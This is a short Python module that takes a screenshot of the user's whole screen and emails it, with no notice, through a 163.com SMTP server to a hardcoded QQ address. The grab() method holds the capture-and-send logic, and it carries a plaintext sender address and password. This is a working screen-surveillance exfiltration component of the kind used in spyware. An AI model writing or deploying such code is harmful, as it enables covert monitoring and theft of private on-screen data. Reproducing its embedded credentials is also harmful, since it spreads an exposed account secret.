import pyscreenshot as ImageGrab
from datetime import datetime
import os, sendEmail

class ScreenShot(object):
    def __init__(self):
        self.dir = os.path.abspath("./screenshot")

    def __createDir(self):
        if not os.path.exists(self.dir):
            os.mkdir(self.dir)
        else:
            if os.path.exists(self.dir + "ss.png"):
                os.remove(self.dir + "ss.png")

    def grab(self):
        self.__createDir()
        now = datetime.now()
        nowTime = now.timestamp()
        name = str(nowTime).split(".")[0]
        im = ImageGrab.grab_to_file(self.dir + "/ss.png")
        print("Taking Successfully")
        from_addr = "liang_renhong@163.com"
        password = "111621116"
        to_addr = "1075220132@qq.com"
        smtp_server = "smtp.163.com"
        subject = "Screenshot Data"
        attachs = [self.dir + "/ss.png"]
        se = sendEmail.SendEmail(from_addr, password, to_addr, smtp_server, subject, attachs)
        se.send()
        

